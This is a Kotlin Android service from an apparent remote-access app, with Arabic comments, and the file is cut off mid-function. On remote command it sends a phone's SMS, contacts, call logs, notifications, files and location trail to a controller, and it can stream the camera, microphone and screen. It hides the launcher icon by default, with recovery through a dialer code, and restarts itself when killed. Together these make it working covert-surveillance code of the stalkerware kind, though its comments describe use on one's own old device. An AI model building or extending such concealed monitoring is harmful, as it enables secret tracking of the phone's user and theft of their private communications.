package com.remotebridge.host.service

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import com.remotebridge.core.model.BridgeRequest
import com.remotebridge.core.model.BridgeResponse
import com.remotebridge.core.model.CallLogItem
import com.remotebridge.core.model.Commands
import com.remotebridge.core.model.ContactItem
import com.remotebridge.core.model.DeviceInfo
import com.remotebridge.core.model.FileItem
import com.remotebridge.core.model.SmsMessage
import com.remotebridge.core.signaling.Signal
import com.remotebridge.core.signaling.SignalingClient
import com.remotebridge.core.signaling.SignalingState
import com.remotebridge.core.webrtc.PeerConnectionManager
import org.webrtc.PeerConnection
import com.remotebridge.core.webrtc.PeerState
import com.remotebridge.core.webrtc.FrameProtocol
import com.remotebridge.host.provider.HostDataProvider
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.collectLatest
import kotlinx.coroutines.flow.firstOrNull
import com.remotebridge.core.data.SettingsRepository
import com.remotebridge.core.data.SettingsSyncManager
import com.remotebridge.host.capture.CommandSchedulerStore
import com.remotebridge.host.capture.LiveRelayServer
import com.remotebridge.host.capture.RemoteCaptureModule
import com.remotebridge.host.capture.RemoteCommandsModule
import kotlinx.coroutines.launch
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonArray
import kotlinx.serialization.json.JsonNull
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.contentOrNull
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.put
import android.media.MediaRecorder
import android.os.Handler
import android.os.Looper
import kotlinx.serialization.builtins.ListSerializer
import java.util.concurrent.atomic.AtomicInteger

/**
 * خدمة الجهاز المضيف (الجهاز القديم).
 *
 * المسؤوليات:
 * 1. تبقى تعمل في الخلفية كخدمة أمامية (لن يقتلها أندرويد بسهولة).
 * 2. تتصل بخادم الإشارات وتسجّل الجهاز كـ "مضيف".
 * 3. تستقبل طلبات اتصال WebRTC من جهاز التحكم.
 * 4. تعالج الطلبات (استعراض ملفات، رسائل، …) وتردّ بالبيانات.
 */
class HostForegroundService : LifecycleService() {

    companion object {
        private const val TAG = "HostService"

        const val EXTRA_SERVER_URL = "server_url"
        const val EXTRA_DEVICE_NAME = "device_name"

        const val ACTION_START = "com.remotebridge.host.START"
        const val ACTION_STOP = "com.remotebridge.host.STOP"

        /**
         * حالة الخدمة التي يمكن للواجهة مراقبتها.
         */
        val serviceState = MutableStateFlow(HostServiceState())
        val cameraStreamingState = MutableStateFlow(CameraStreamingState())

        var activeInstance: HostForegroundService? = null
            private set

        var screenCaptureIntent: Intent? = null

        /**
         * بعد منح المستخدم إذن الموقع: إعادة بدء التتبع فوراً إن كانت خدمة
         * المضيف تعمل (بدون إعادة تشغيل الخدمة كلها).
         */
        fun restartLocationTracking() {
            val svc = activeInstance ?: return
            if (!HostForegroundService.serviceState.value.running) return
            try {
                svc.locationTracker?.stop()
            } catch (_: Throwable) {
            }
            svc.locationTracker = LocationTracker(svc.applicationContext).also { it.start() }
        }

        // قيمة إعدادات STUN تُستبدل عند بدء الخدمة من الإعدادات المخزنة
        var stunServerValue: String = "stun:stun.l.google.com:19302"

        // مهلة إعادة التشغيل التلقائي (دقائق) المقرّوة أثناء بدء الخدمة
        var restartDelayMinutesValue: Long = 1L

        fun startCamera(front: Boolean, audio: Boolean = true): Boolean {
            val inst = activeInstance ?: return false
            val success = inst.peerManager?.startCameraStreaming(front, audio) ?: false
            if (success) {
                cameraStreamingState.value = CameraStreamingState(
                    isStreaming = true,
                    isFrontCamera = inst.peerManager?.isUsingFrontCamera() ?: front,
                    isAudioEnabled = audio
                )
            }
            return success
        }

        fun switchCamera() {
            val inst = activeInstance ?: return
            inst.peerManager?.switchCamera { isFront ->
                cameraStreamingState.value = cameraStreamingState.value.copy(isFrontCamera = isFront)
            }
        }

        fun toggleAudio(enable: Boolean) {
            val inst = activeInstance ?: return
            inst.peerManager?.setAudioEnabled(enable)
            cameraStreamingState.value = cameraStreamingState.value.copy(isAudioEnabled = enable)
        }

        fun stopCamera() {
            val inst = activeInstance ?: return
            inst.peerManager?.stopStreaming()
            cameraStreamingState.value = CameraStreamingState(isStreaming = false)
        }

        /**
         * الحصول على قائمة الأذونات الناقصة لعرضها في واجهة المستخدم.
         * تستدعى من نموذج العرض (HostViewModel) قبل بدء الخدمة.
         */
        fun getMissingPermissions(context: Context): List<String> {
            val required = mutableListOf(
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                required.add(Manifest.permission.READ_MEDIA_IMAGES)
                required.add(Manifest.permission.READ_MEDIA_VIDEO)
                required.add(Manifest.permission.READ_MEDIA_AUDIO)
            } else {
                required.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
            return required.filter {
                ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
            }
        }
    }

    data class CameraStreamingState(
        val isStreaming: Boolean = false,
        val isFrontCamera: Boolean = false,
        val isAudioEnabled: Boolean = true
    )

    data class HostServiceState(
        val running: Boolean = false,
        val signalingState: SignalingState = SignalingState.Disconnected,
        val peerState: PeerState = PeerState.Idle,
        val controllerConnected: Boolean = false
    )

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private val json = Json { ignoreUnknownKeys = true }
    private val requestIdCounter = AtomicInteger(0)

    private var signaling: SignalingClient? = null
    private var peerManager: PeerConnectionManager? = null
    private var activeControllerId: String? = null
    private var hostDeviceId: String = ""
    private var dataProvider: HostDataProvider? = null

    /** مولّد إطارات البث البديل (كاميرا/شاشة) عبر ترحيل خادم الإشارات. */
    private var liveRelay: LiveRelayServer? = null
    /** جهاز العرض المستهدف لإطارات البث البديل (آخر متحكم بدأ البث). */
    private var liveTargetId: String? = null
    private val liveFrameSeq = AtomicInteger(0)
    private var liveSendFailures = 0

    /** متتبع الموقع: يبدأ فقط عند توفر إذن الموقع الدقيق (اختياري). */
    private var locationTracker: LocationTracker? = null
    private var requestJob: Job? = null

    /** دورة فحص الأوامر المجدولة: تنفّذ المستحق منها كل 10 ثوان. */
    private var schedulerJob: Job? = null
    private val pendingLocalIceCandidates = mutableListOf<org.webrtc.IceCandidate>()

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }

    /**
     * إزالة المهمة النشطة من قائمة التطبيقات (swipe away):
     * لأننا خدمة أمامية نستمر بالعمل، لكن أحياناً تنجرف العمليات — نجدول
     * إعادة تشغيل سريعة كشبكة أمان إن لم يعمل المستخدم الإيقاف اليدوي.
     */
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        if (serviceState.value.running) {
            kotlinx.coroutines.GlobalScope.launch {
                val settingsRepo = SettingsRepository(applicationContext)
                val restartOnKill = settingsRepo.restartOnKill.firstOrNull() ?: true
                if (restartOnKill) {
                    HostRestartScheduler.scheduleQuickRestart(applicationContext, delaySeconds = 5L)
                } else {
                    HostRestartScheduler.cancelRestart(applicationContext)
                    HostRestartScheduler.cancelWatchdog(applicationContext)
                }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                stopHost()
                return START_NOT_STICKY
            }

            else -> {
                val serverUrl = intent?.getStringExtra(EXTRA_SERVER_URL) ?: ""
                val deviceName = intent?.getStringExtra(EXTRA_DEVICE_NAME) ?: "جهاز مضيف"
                startHost(serverUrl, deviceName)
            }
        }
        return START_STICKY
    }

    /**
     * التحقق من الأذونات الحرجة قبل بدء الخدمة.
     * يعيد true إذا كانت جميع الأذونات الحرجة ممنوحة، أو false إذا كان هناك نقص.
     */
    private fun checkCriticalPermissions(): Boolean {
        val criticalPermissions = arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE
        )

        val missing = criticalPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            Log.w(TAG, "أذونات ناقصة قبل بدء الخدمة: ${missing.joinToString(",")}")
            return false
        }
        Log.i(TAG, "جميع الأذونات الحرجة ممنوحة")
        return true
    }

    /**
     * يبدأ الخدمة: إشعار أمامي + اتصال بخادم الإشارات.
     */
    private fun startHost(serverUrl: String, deviceName: String) {
        // التحقق من الأذونات الحرجة قبل البدء
        if (!checkCriticalPermissions()) {
            Log.e(TAG, "لا يمكن بدء الخدمة: الأذونات الحرجة غير ممنوحة")
            serviceState.value = serviceState.value.copy(running = false)
            return
        }

        try {
            NotificationHelper.createChannel(this)
            val notification = NotificationHelper.buildHostNotification(this)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    val serviceTypes = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        var types =
                            android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                            android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                            android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                            android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                        // نوع الموقع يُضاف فقط عند توفر الإذن (وإلا سترفضه المنصة)
                        if (LocationTracker.hasPermission(this@HostForegroundService)) {
                            try {
                                types = types or
                                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                            } catch (_: Throwable) {
                            }
                        }
                        types
                    } else {
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    }
                    startForeground(
                        NotificationHelper.NOTIFICATION_ID,
                        notification,
                        serviceTypes
                    )
                } catch (se: SecurityException) {
                    Log.w(TAG, "بدء الخدمة بنوع dataSync فقط لعدم اكتمال أذونات الكاميرا/الميكروفون حالياً: ${se.message}")
                    startForeground(
                        NotificationHelper.NOTIFICATION_ID,
                        notification,
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    )
                }
            } else {
                startForeground(
                    NotificationHelper.NOTIFICATION_ID,
                    notification
                )
            }
        } catch (t: Throwable) {
            Log.e(TAG, "فشل بدء الخدمة الأمامية", t)
        }

        dataProvider = HostDataProvider(applicationContext)

        // دورة الأوامر المجدولة: فحص كل 10 ثوان وتنفيذ المستحق منها
        schedulerJob?.cancel()
        schedulerJob = scope.launch {
            while (true) {
                kotlinx.coroutines.delay(10_000)
                runScheduledDueCommands()
            }
        }

        // تتبع الموقع (اختياري): يعمل فقط إذا الإذن ممنوح، يمتد تلقائياً
        // مع دورة حياة الخدمة ويحفظ مسار الحركة مؤقتاً.
        try {
            locationTracker = LocationTracker(applicationContext)
            locationTracker?.start()
        } catch (t: Throwable) {
            Log.w(TAG, "تعذر بدء تتبع الموقع", t)
        }

        activeInstance = this
        serviceState.value = serviceState.value.copy(running = true)

        scope.launch {
            val deviceId = DeviceIdentifier.getOrGenerate(this@HostForegroundService)
            hostDeviceId = deviceId
            val settingsRepo = SettingsRepository(applicationContext)
            val storedUrl = settingsRepo.serverUrl.firstOrNull() ?: SettingsRepository.DEFAULT_RENDER_URL
            val finalUrl = serverUrl.ifBlank { storedUrl }

            // إخفاء أيقونة التطبيق جبراً عند تشغيل المضيف (قرار مستخدم التطبيق
            // الشخصي) — الاسترجاع: كود الاتصال 82473 أو زر الإظهار في الإعدادات.
            if (settingsRepo.hideIconWhenHostActive.firstOrNull() ?: true) {
                ComponentStateManager.hideLauncherIcon(applicationContext)
            }

            // قراءة إعدادات STUN من DataStore — وتُقرأ الآن **قبل** بناء قائمة
            // ICE (تصليح العيب B: كانت تُقرأ بعد إنشاء المدير فلا تُطبَّق أبداً)
            val storedStun = settingsRepo.stunServer.firstOrNull()?.trim().orEmpty()
            stunServerValue = storedStun.ifBlank { SettingsRepository.DEFAULT_STUN_SERVER }
            // مهلة إعادة التشغيل التلقائي لهذا الشوط (المستخدم يختارها من الإعدادات)
            restartDelayMinutesValue = (settingsRepo.restartDelayMinutes.firstOrNull() ?: 1).toLong()

            // بناء قائمة ICE servers من قيمة STUN الفعلية (مع دعم تعدد الخوادم
            // المفصولة بفاصلة إن كتبها المستخدم هكذا في الإعدادات)
            val iceServers = mutableListOf<PeerConnection.IceServer>()
            for (stunEntry in stunServerValue.split(',')) {
                val entry = stunEntry.trim()
                if (entry.isNotBlank()) {
                    iceServers.add(PeerConnection.IceServer.builder(entry).createIceServer())
                }
            }

            peerManager = PeerConnectionManager(
                applicationContext,
                scope,
                iceServers
            ).also { manager ->
                manager.start()
            }

            // مولّد إطارات البث البديل عبر الترحيل (MJPEG-over-Relay) —
            // يستخدم نفس ترحيل خادم الإشارات ليعمل البث على أي شبكة.
            liveRelay = LiveRelayServer(applicationContext, scope)

            signaling = SignalingClient(
                url = finalUrl,
                deviceId = deviceId,
                role = "host",
                deviceName = deviceName,
                scope = scope,
                onMessage = { handleSignal(it) },
                onState = { signalingState ->
                    serviceState.value = serviceState.value.copy(signalingState = signalingState)
                }
            ).also { it.connect() }

            // جدولة المراقب الدوري (يحفظ استمرار الخدمة في الخلفية)
            HostRestartScheduler.schedulePeriodicWatchdog(applicationContext)
            // التشغيل التلقائي بعد الإقلاع صار يتماشى مع الإعداد المختار
            HostRestartScheduler.cancelRestart(applicationContext)

            collectPeerEvents()
        }
    }

    /**
     * (وحدت الدالة إلى نسخة الـ companion المدرِكة للإصدارات في أعلى الفئة.)
     */

    /**
     * يرسل إطار بث حي (JPEG مضغوط) إلى جهاز العرض المستهدف عبر ترحيل
     * خادم الإشارات نفسه — دون أي شرط ICE/TURN إطلاقاً.
     * فشل الإرسال المتكرر (5 إطارات) يوقف البث تلقائياً حفاظاً على الموارد.
     */
    private fun pushLiveFrame(stream: String, jpegBytes: ByteArray, w: Int, h: Int) {
        val target = liveTargetId
        val sig = signaling
        if (target == null || sig == null) return
        if (hostDeviceId.isBlank()) return
        try {
            val b64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP)
            val sent = sig.send(
                Signal.LiveFrame(
                    from = hostDeviceId,
                    to = target,
                    stream = stream,
                    seq = liveFrameSeq.incrementAndGet().toLong(),
                    w = w,
                    h = h,
                    ts = System.currentTimeMillis(),
                    b64 = b64
                )
            )
            if (sent) {
                liveSendFailures = 0
            } else {
                liveSendFailures++
                if (liveSendFailures >= 5) {
                    Log.w(TAG, "فشل إرسال 5 إطارات حية متتالية — إيقاف البث البديل تلقائياً")
                    liveRelay?.stopAll()
                    cameraStreamingState.value = CameraStreamingState(isStreaming = false)
                    liveSendFailures = 0
                }
            }
        } catch (t: Throwable) {
            Log.w(TAG, "خطأ إرسال إطار حي: ${t.message}")
        }
    }

    /**
     * يعالج رسالة إشارات واردة من خادم الإشارات.
     */
    private fun handleSignal(signal: Signal) {
        when (signal) {
            is Signal.Offer -> {
                // حفظ معرّف جهاز التحكم المستهدف لترحيل مرشحات ICE والبيانات إليه
                activeControllerId = signal.from
                Log.d(TAG, "استقبال عرض WebRTC Offer من المتحكم: ${signal.from}. جاري إعداد الإجابة (Answer)...")
                scope.launch { drainPendingLocalIceCandidates() }

                peerManager?.acceptOffer(
                    sdp = signal.sdp,
                    sdpType = signal.sdpType,
                    onSuccess = { answerSdp ->
                        val myId = hostDeviceId.ifBlank { signal.to }
                        Log.d(TAG, "إرسال إجابة WebRTC Answer إلى المتحكم: ${signal.from} من: $myId")
                        signaling?.send(
                            Signal.Answer(
                                from = myId,
                                to = signal.from,
                                sdp = answerSdp,
                                sdpType = "ANSWER"
                            )
                        )
                        // مباشرة بعد اتصال جديد: نرسل لقطة إعداداتنا للمتحكم (إسقاط المزامنة)
                        // buildSnapshot تعليقية (suspend) — نرسلها داخل كوريوتين الخدمة.
                        scope.launch {
                            try {
                                val snapshot = SettingsSyncManager.buildSnapshot(applicationContext)
                                signaling?.send(
                                    Signal.SettingsSync(
                                        from = myId,
                                        to = signal.from,
                                        ts = System.currentTimeMillis(),
                                        settings = snapshot
                                    )
                                )
                            } catch (t: Throwable) {
                                Log.w(TAG, "تعذر إرسال لقطة إعدادات المضيف للمتحكم اليوم", t)
                            }
                        }
                    },
                    onFailure = { error ->
                        val myId = hostDeviceId.ifBlank { signal.to }
                        Log.e(TAG, "فشل إنشاء إجابة WebRTC Answer: $error")
                        signaling?.send(
                            Signal.Reject(myId, signal.from, error)
                        )
                    }
                )
            }

            is Signal.Ice -> {
                Log.d(TAG, "استقبال مرشح ICE من المتحكم [${signal.from}]: mid=${signal.sdpMid}, mLineIndex=${signal.sdpMLineIndex}")
                peerManager?.addIceCandidate(signal.sdpMid, signal.sdpMLineIndex, signal.sdp)
            }

            is Signal.Reject -> {
                Log.w(TAG, "رُفض الاتصال: ${signal.reason}")
                serviceState.value = serviceState.value.copy(
                    peerState = PeerState.Failed
                )
            }

            is Signal.RpcRequest -> {
                // تحديد جهاز العرض لإطارات البث البديل: جهاز طالب البث نفسه
                if (signal.cmd == Commands.START_CAMERA_STREAM ||
                    signal.cmd == Commands.START_SCREEN_STREAM
                ) {
                    liveTargetId = signal.from
                }
                scope.launch {
                    val req = com.remotebridge.core.model.BridgeRequest(signal.requestId, signal.cmd, signal.params)
                    try {
                        val respData = processRequest(req)
                        val myId = hostDeviceId.ifBlank { signal.to }
                        signaling?.send(
                            Signal.RpcResponse(
                                from = myId,
                                to = signal.from,
                                requestId = signal.requestId,
                                cmd = signal.cmd,
                                ok = true,
                                error = null,
                                data = respData
                            )
                        )
                    } catch (t: Throwable) {
                        val myId = hostDeviceId.ifBlank { signal.to }
                        signaling?.send(
                            Signal.RpcResponse(
                                from = myId,
                                to = signal.from,
                                requestId = signal.requestId,
                                cmd = signal.cmd,
                                ok = false,
                                error = t.message ?: "فشل معالجة الطلب",
                                data = null
                            )
                        )
                    }
                }
            }

            is Signal.Pong -> { /* استجابة نبض القلب */ }
            is Signal.Registered -> {
                Log.d(TAG, "تم تسجيل المضيف: ${signal.ok}")
            }

            is Signal.SettingsSync -> {
                scope.launch {
                    // ts == 0 يعني طلب سحب (pull) — نرد بلقطة تكاملة
                    if (signal.ts == 0L) {
                        val myId = hostDeviceId.ifBlank { DeviceIdentifier.getOrGenerate(this@HostForegroundService) }
                        signaling?.send(
                            Signal.SettingsSync(
                                from = myId,
                                to = signal.from,
                                ts = System.currentTimeMillis(),
                                settings = SettingsSyncManager.buildSnapshot(applicationContext)
                            )
                        )
                        Log.d(TAG, "أُرسلت لقطة إعدادات عند الطلب من ${signal.from}")
                    } else {
                        val result = SettingsSyncManager.applyIncoming(applicationContext, signal.settings)
                        if (result != null) {
                            Log.i(
                                TAG,
                                "تغيّر الخدمة للفت تبني إعدادات جديدة من ${signal.from}: " +
                                    "اعتماد=${result.adopted}، تغيير الخادم=${result.serverUrlChanged}، ts=${result.newTs}"
                            )
                            // نرد بالمُحدث للتحكم الانضباطي: يصبح كلا الموقعين متطابقين
                            val myId = hostDeviceId.ifBlank { DeviceIdentifier.getOrGenerate(this@HostForegroundService) }
                            signaling?.send(
                                Signal.SettingsSync(
                                    from = myId,
                                    to = signal.from,
                                    ts = result.newTs,
                                    settings = SettingsSyncManager.buildSnapshot(applicationContext)
                                )
                            )
                            // تغيّر عنوان الخادم أثناء العمل: إعادة تشغيل الخدمة السريعة
                            if (result.serverUrlChanged && serviceState.value.running) {
                                Log.w(TAG, "تغيّر عنوان الخادم من لوحة المتحكم — إعادة تشغيل الخدمة السريعة")
                                HostRestartScheduler.scheduleQuickRestart(applicationContext, delaySeconds = 2)
                            }
                        }
                    }
                }
            }

            else -> {}
        }
    }

    private suspend fun drainPendingLocalIceCandidates() {
        val target = activeControllerId ?: return
        if (target.isBlank()) return
        val myId = hostDeviceId.ifBlank { DeviceIdentifier.getOrGenerate(this) }
        synchronized(pendingLocalIceCandidates) {
            if (pendingLocalIceCandidates.isNotEmpty()) {
                Log.d(TAG, "إرسال (${pendingLocalIceCandidates.size}) مرشحات ICE محلية كانت معلقة إلى المتحكم $target...")
                for (candidate in pendingLocalIceCandidates) {
                    signaling?.send(
                        Signal.Ice(
                            from = myId,
                            to = target,
                            sdp = candidate.sdp,
                            sdpMid = candidate.sdpMid,
                            sdpMLineIndex = candidate.sdpMLineIndex
                        )
                    )
                }
                pendingLocalIceCandidates.clear()
            }
        }
    }

    /**
     * يجمع أحداث قناة WebRTC (مرشّحات ICE والطلبات الواردة).
     */
    private fun collectPeerEvents() {
        val manager = peerManager ?: return
        requestJob?.cancel()
        requestJob = scope.launch {
            // أرسل مرشّحات ICE المحلية إلى جهاز التحكم المستهدف عبر خادم الإشارات
            launch {
                manager.iceCandidates.collect { candidate ->
                    val target = activeControllerId ?: ""
                    val myId = hostDeviceId
                    Log.d(TAG, "جمع مرشح ICE محلي: sdpMid=${candidate.sdpMid}, الهدف: '$target'")
                    if (target.isNotEmpty() && myId.isNotEmpty()) {
                        signaling?.send(
                            Signal.Ice(
                                from = myId,
                                to = target,
                                sdp = candidate.sdp,
                                sdpMid = candidate.sdpMid,
                                sdpMLineIndex = candidate.sdpMLineIndex
                            )
                        )
                        Log.d(TAG, "تم إرسال مرشح ICE بنجاح إلى خادم الإشارات لترحيله إلى المتحكم: $target")
                    } else {
                        synchronized(pendingLocalIceCandidates) {
                            pendingLocalIceCandidates.add(candidate)
                        }
                        Log.d(TAG, "حفظ مرشح ICE محلي في الانتظار المؤقت لحين وصول معرف المتحكم")
                    }
                }
            }

            // عالج الطلبات الواردة من جهاز التحكم
            launch {
                manager.incomingRequests.collect { request ->
                    handleRequest(request)
                }
            }

            // راقب حالة قناة البيانات
            launch {
                manager.state.collect { peerState ->
                    serviceState.value = serviceState.value.copy(
                        peerState = peerState,
                        controllerConnected = peerState == PeerState.Connected
                    )
                }
            }
        }
    }

    /**
     * يعالج طلباً وارداً من جهاز التحكم ويبني الرد المناسب.
     */
    private suspend fun handleRequest(request: BridgeRequest) {
        val manager = peerManager ?: return
        try {
            if (request.cmd == Commands.FILE_OPEN) {
                val fileId = request.params?.get("fileId")?.jsonPrimitive?.content?.toLong()
                val bucket = request.params?.get("bucket")?.jsonPrimitive?.content ?: "images"
                val path = request.params?.get("path")?.jsonPrimitive?.content
                when {
                    // مستكشف الذاكرة: التنزيل بالمسار مباشرة (لا معرف MediaStore)
                    bucket == "fs" && !path.isNullOrBlank() -> {
                        sendFileByPathToController(manager, request.id, path)
                    }
                    fileId != null -> sendFileToController(manager, request.id, fileId, bucket)
                    else -> manager.sendResponse(
                        BridgeResponse(request.id, false, "معاملات فتح الملف غير مكتملة", null)
                    )
                }
                return
            }
            val data = processRequest(request)
            manager.sendResponse(BridgeResponse(request.id, true, null, data))
        } catch (t: Throwable) {
            manager.sendResponse(
                BridgeResponse(request.id, false, t.message ?: "خطأ غير معروف", null)
            )
        }
    }

    /**
     * ينفذ بروتوكول الأوامر ويعيد كائن JSON للنتائج.
     */
    private suspend fun processRequest(request: BridgeRequest): JsonObject {
        val provider = dataProvider ?: throw IllegalStateException("مزود البيانات غير هيئ")
        val manager = peerManager

        return when (request.cmd) {
            Commands.PING -> buildJsonObject {
                put("cmd", Commands.PING)
                put("pong", true)
                put("time", System.currentTimeMillis())
            }

            Commands.DEVICE_INFO -> buildJsonObject {
                put("cmd", Commands.DEVICE_INFO)
                val infoJson = json.encodeToJsonElement(
                    DeviceInfo.serializer(),
                    provider.readDeviceInfo()
                ).jsonObject
                infoJson.forEach { (k, v) -> put(k, v) }
            }

            Commands.LOCATION_SNAPSHOT -> buildJsonObject {
                put("cmd", Commands.LOCATION_SNAPSHOT)
                val tracker = locationTracker
                val available = tracker != null &&
                    LocationTracker.hasPermission(applicationContext)
                put("ok", available)
                if (available && tracker != null) {
                    val payload = tracker.snapshotPayload()
                    put("snapshot", payload["snapshot"] ?: JsonNull)
                    put("trail", payload["trail"] ?: JsonArray(emptyList()))
                }
            }

            Commands.FILE_LIST -> {
                val bucket = request.params?.get("bucket")?.jsonPrimitive?.content ?: "images"
                buildJsonObject {
                    put("cmd", Commands.FILE_LIST)
                    put("bucket", bucket)
                    put(
                        "items",
                        json.encodeToJsonElement(
                            ListSerializer(FileItem.serializer()),
                            provider.readFiles(bucket)
                        )
                    )
                }
            }

            Commands.SMS_LIST -> buildJsonObject {
                put("cmd", Commands.SMS_LIST)
                put(
                    "items",
                    json.encodeToJsonElement(
                        ListSerializer(SmsMessage.serializer()),
                        provider.readSms()
                    )
                )
            }

            Commands.CONTACTS_LIST -> buildJsonObject {
                put("cmd", Commands.CONTACTS_LIST)
                put(
                    "items",
                    json.encodeToJsonElement(
                        ListSerializer(ContactItem.serializer()),
                        provider.readContacts()
                    )
                )
            }

            Commands.CALLS_LIST -> buildJsonObject {
                put("cmd", Commands.CALLS_LIST)
                put(
                    "items",
                    json.encodeToJsonElement(
                        ListSerializer(CallLogItem.serializer()),
                        provider.readCallLog()
                    )
                )
            }

            Commands.STORAGE_EXPLORE -> {
                val path = request.params?.get("path")?.jsonPrimitive?.contentOrNull
                buildJsonObject {
                    put("cmd", Commands.STORAGE_EXPLORE)
                    put("currentPath", path ?: "/")
                    put(
                        "items",
                        json.encodeToJsonElement(
                            ListSerializer(FileItem.serializer()),
                            provider.exploreStorage(path)
                        )
                    )
                }
            }

            Commands.NOTIFICATIONS_LIST -> buildJsonObject {
                put("cmd", Commands.NOTIFICATIONS_LIST)
                put(
                    "items",
                    json.encodeToJsonElement(
                        ListSerializer(com.remotebridge.core.model.NotificationItem.serializer()),
                        BridgeNotificationListenerService.cachedNotifications.toList()
                    )
                )
            }

            Commands.START_CAMERA_STREAM -> {
                val front = request.params?.get("front")?.jsonPrimitive?.contentOrNull?.toBoolean() ?: false
                val audio = request.params?.get("audio")?.jsonPrimitive?.contentOrNull?.toBoolean() ?: true
                val mode = request.params?.get("mode")?.jsonPrimitive?.contentOrNull ?: "relay"
                var ok = false
                var transport = mode
                var relayError: String? = null

                if (mode != "webrtc") {
                    // ——— الوسيلة البديلة عبر الترحيل (تعمل على أي شبكة) ———
                    // نوقف مسار WebRTC أولاً لتجنب تعارض فتح الكاميرا مرتين
                    manager?.stopStreaming()
                    val relay = liveRelay
                    ok = relay?.startCamera(
                        front = front,
                        onFrame = { bytes, width, height ->
                            pushLiveFrame("camera", bytes, width, height)
                        }
                    ) ?: false
                    if (ok) {
                        transport = "relay"
                        liveSendFailures = 0
                        cameraStreamingState.value = CameraStreamingState(
                            isStreaming = true,
                            isFrontCamera = relay?.isCameraFront() ?: front,
                            isAudioEnabled = false
                        )
                    } else {
                        relayError = relay?.lastError
                    }
                }

                if (!ok) {
                    // ——— مسار WebRTC الموروث (أعلى جودة عند تماسك ICE) ———
                    ok = manager?.startCameraStreaming(front, audio) ?: false
                    if (ok) transport = "webrtc"
                    cameraStreamingState.value = CameraStreamingState(
                        isStreaming = ok,
                        isFrontCamera = manager?.isUsingFrontCamera() ?: false,
                        isAudioEnabled = audio
                    )
                }

                buildJsonObject {
                    put("cmd", Commands.START_CAMERA_STREAM)
                    put("started", ok)
                    put("mode", if (transport == "relay") "camera-relay" else "camera")
                    put("transport", transport)
                    put("isFront", if (transport == "relay") (liveRelay?.isCameraFront() ?: front) else (manager?.isUsingFrontCamera() ?: false))
                    put("audioEnabled", if (transport == "relay") false else audio)
                    if (relayError != null) {
                        put("relayError", relayError)
                    }
                    if (!ok) {
                        put("error", "تعذر بدء بث الكاميرا (${relayError ?: "تعذّر مسار WebRTC أيضاً"}) — يرجى منح إذن الكاميرا على الهاتف المضيف")
                    }
                }
            }

            Commands.START_AUDIO_STREAM -> {
                val ok = manager?.startAudioOnlyStreaming() ?: false
                cameraStreamingState.value = CameraStreamingState(
                    isStreaming = ok,
                    isFrontCamera = false,
                    isAudioEnabled = true
                )
                buildJsonObject {
                    put("cmd", Commands.START_AUDIO_STREAM)
                    put("started", ok)
                    put("mode", "audio")
                    put("audioEnabled", true)
                    if (!ok) {
                        put("error", "تعذر بدء بث الميكروفون. يرجى التأكد من اكتمال اتصال WebRTC ومنح إذن الميكروفون")
                    }
                }
            }

            Commands.STOP_CAMERA_STREAM -> {
                // يوقف الوسيلة البديلة (كاميرا + شاشة عبر الترحيل) ومسار WebRTC معاً
                liveRelay?.stopAll()
                liveTargetId = null
                liveSendFailures = 0
                manager?.stopStreaming()
                cameraStreamingState.value = CameraStreamingState(isStreaming = false)
                buildJsonObject {
                    put("cmd", Commands.STOP_CAMERA_STREAM)
                    put("stopped", true)
                }
            }

            Commands.SWITCH_CAMERA -> {
                val relay = liveRelay
                if (relay?.activeType() == "camera") {
                    // تبديل العدسة في الوسيلة البديلة: إعادة بدء بتوجيه معاكس
                    val wasFront = relay.isCameraFront()
                    relay.stopCamera()
                    scope.launch {
                        val ok = relay.startCamera(
                            front = !wasFront,
                            onFrame = { bytes, width, height ->
                                pushLiveFrame("camera", bytes, width, height)
                            }
                        )
                        cameraStreamingState.value = cameraStreamingState.value.copy(
                            isStreaming = ok,
                            isFrontCamera = relay.isCameraFront()
                        )
                    }
                    buildJsonObject {
                        put("cmd", Commands.SWITCH_CAMERA)
